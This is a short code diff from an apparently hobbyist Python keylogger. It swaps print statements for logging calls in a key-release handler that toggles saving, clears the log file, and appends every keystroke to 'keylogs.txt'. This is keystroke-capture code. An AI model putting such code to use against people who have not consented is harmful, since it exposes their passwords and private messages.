@@ -37,17 +37,17 @@ def on_press(key):
 def on_release(key):
     global save
     if key == Key.esc:
-        print('Listening finished')
+        log('Listening finished')
         return False
     elif key == Key.tab:
         if save == True:
             save = False
-            print('Saving stopped, if you want to continue, press "Tab"')
+            log('Saving stopped, if you want to continue, press "Tab"')
         else:
             save = True
-            print('Saving restarted')
+            log('Saving restarted')
     elif key == Key.delete:
-        print('File cleaned')
+        log('File cleaned')
         clear_file()        
     with open('keylogs.txt', "a", encoding="utf-8") as file:
         k = str(key).replace("'", "")
